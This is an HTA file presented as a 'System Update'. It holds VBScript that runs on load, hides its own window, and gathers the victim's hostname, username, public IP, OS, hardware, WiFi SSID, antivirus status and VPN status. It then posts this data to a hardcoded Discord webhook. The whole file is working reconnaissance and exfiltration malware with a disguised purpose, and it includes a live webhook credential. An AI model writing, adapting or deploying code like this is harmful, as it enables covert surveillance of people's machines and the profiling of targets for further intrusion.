<!DOCTYPE html>
<html>
<head>
    <title>System Update</title>
    <hta:application id="oHTA" border="none" caption="no" showintaskbar="no" windowstate="minimize" />
</head>
<body>
    <script language="VBScript">
        Sub Window_OnLoad
            ' Auto-run on load, hide window
            window.resizeTo 0,0
            window.moveTo -1000,-1000
            Call Main()
        End Sub

        Function GetWMIData(strClass, strProperty)
            On Error Resume Next
            Dim objWMIService, colItems, objItem, result
            result = "Unknown"
            
            Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
            Set colItems = objWMIService.ExecQuery("Select * from " & strClass)
            
            For Each objItem in colItems
                result = Eval("objItem." & strProperty)
                Exit For
            Next
            
            GetWMIData = result
            Set colItems = Nothing
            Set objWMIService = Nothing
        End Function

        Function GetGPUInfo()
            On Error Resume Next
            Dim objWMIService, colItems, objItem, gpuInfo
            gpuInfo = ""
            
            Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
            Set colItems = objWMIService.ExecQuery("Select * from Win32_VideoController")
            
            For Each objItem in colItems
                gpuInfo = gpuInfo & objItem.Name & " [" & objItem.AdapterRAM/1024/1024 & "MB] | "
            Next
            
            If gpuInfo = "" Then gpuInfo = "Unknown"
            GetGPUInfo = gpuInfo
        End Function

        Function GetCPUInfo()
            On Error Resume Next
            Dim objWMIService, colItems, objItem, cpuInfo
            cpuInfo = ""
            
            Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
            Set colItems = objWMIService.ExecQuery("Select * from Win32_Processor")
            
            For Each objItem in colItems
                cpuInfo = objItem.Name & " (" & objItem.NumberOfCores & "C/" & objItem.NumberOfLogicalProcessors & "T)"
            Next
            
            If cpuInfo = "" Then cpuInfo = "Unknown"
            GetCPUInfo = cpuInfo
        End Function

        Function GetSSID()
            On Error Resume Next
            Dim objShell, objExec, strLine, ssid
            ssid = "Not Connected/No WiFi"
            
            Set objShell = CreateObject("WScript.Shell")
            Set objExec = objShell.Exec("netsh wlan show interfaces")
            
            Do While Not objExec.StdOut.AtEndOfStream
                strLine = objExec.StdOut.ReadLine()
                If InStr(strLine, "SSID") > 0 And InStr(strLine, "BSSID") = 0 Then
                    ssid = Trim(Split(strLine, ":")(1))
                    Exit Do
                End If
            Loop
            
            GetSSID = ssid
            Set objExec = Nothing
            Set objShell = Nothing
        End Function

        Function GetAntivirus()
            On Error Resume Next
            Dim objWMIService, colItems, objItem, avList
            avList = ""
            
            Set objWMIService = GetObject("winmgmts:\\.\root\SecurityCenter2")
            Set colItems = objWMIService.ExecQuery("Select * from AntiVirusProduct")
            
            For Each objItem in colItems
                avList = avList & objItem.displayName & " [" & GetAVState(objItem.productState) & "] | "
            Next
            
            If avList = "" Then avList = "None detected/Windows Defender"
            GetAntivirus = avList
        End Function

        Function GetAVState(state)
            ' Decode product state
            Dim hexState
            hexState = Hex(state)
            If Len(hexState) >= 2 Then
                Select Case Right(hexState, 2)
                    Case "00" GetAVState = "OFF"
                    Case "01" GetAVState = "ON"
                    Case "10" GetAVState = "SNOOZED"
                    Case Else GetAVState = "UNKNOWN"
                End Select
            Else
                GetAVState = "UNKNOWN"
            End If
        End Function

        Function GetVPNStatus()
            On Error Resume Next
            Dim objWMIService, colItems, objItem, vpnStatus
            vpnStatus = "No VPN detected"
            
            Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
            Set colItems = objWMIService.ExecQuery("Select * from Win32_NetworkAdapter WHERE NetConnectionStatus = 2")
            
            For Each objItem in colItems
                If InStr(LCase(objItem.Name), "vpn") > 0 OR InStr(LCase(objItem.Name), "virtual") > 0 OR InStr(LCase(objItem.Name), "tunnel") > 0 Then
                    vpnStatus = "YES - " & objItem.Name
                    Exit For
                End If
            Next
            
            GetVPNStatus = vpnStatus
        End Function

        Function GetPublicIP()
            On Error Resume Next
            Dim objShell, objExec, strLine, ip
            ip = "Unknown"
            
            Set objShell = CreateObject("WScript.Shell")
            Set objExec = objShell.Exec("powershell -command ""(Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content""")
            
            If Not objExec.StdOut.AtEndOfStream Then
                ip = Trim(objExec.StdOut.ReadLine())
            End If
            
            GetPublicIP = ip
            Set objExec = Nothing
            Set objShell = Nothing
        End Function

        Sub Main()
            Dim webhookUrl, payload, objHTTP
            webhookUrl = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK"
            
            ' Gather all intel
            Dim cpu, gpu, ssid, av, vpn, ip, hostname, username, os
            cpu = GetCPUInfo()
            gpu = GetGPUInfo()
            ssid = GetSSID()
            av = GetAntivirus()
            vpn = GetVPNStatus()
            ip = GetPublicIP()
            hostname = CreateObject("WScript.Network").ComputerName
            username = CreateObject("WScript.Network").UserName
            os = GetWMIData("Win32_OperatingSystem", "Caption") & " " & GetWMIData("Win32_OperatingSystem", "Version")
            
            ' Build Discord payload
            Dim jsonPayload
            jsonPayload = "{""embeds"":[{""title"":""🔴 SYSTEM INTEL - " & hostname & """,""description"":""Comprehensive system enumeration completed."",""color"":15158332,""fields"":[" & _
                "{""name"":""🖥️ Hostname"",""value"":""" & hostname & """,""inline"":true}," & _
                "{""name"":""👤 Username"",""value"":""" & username & """,""inline"":true}," & _
                "{""name"":""🌐 Public IP"",""value"":""" & ip & """,""inline"":true}," & _
                "{""name"":""💻 OS"",""value"":""" & os & """,""inline"":false}," & _
                "{""name"":""⚡ CPU"",""value"":""" & cpu & """,""inline"":false}," & _
                "{""name"":""🎮 GPU"",""value"":""" & gpu & """,""inline"":false}," & _
                "{""name"":""📶 WiFi SSID"",""value"":""" & ssid & """,""inline"":true}," & _
                "{""name"":""🛡️ Antivirus"",""value"":""" & av & """,""inline"":false}," & _
                "{""name"":""🔒 VPN Status"",""value"":""" & vpn & """,""inline"":true}" & _
                "],""footer"":{""text"":""Deployed via HTA @ " & Now & """}}]}"
            
            ' Send to Discord
            Set objHTTP = CreateObject("Microsoft.XMLHTTP")
            objHTTP.Open "POST", webhookUrl, False
            objHTTP.setRequestHeader "Content-Type", "application/json"
            objHTTP.send jsonPayload
            
            ' Cleanup and exit
            Set objHTTP = Nothing
            window.close()
        End Sub
    </script>
</body>
</html>
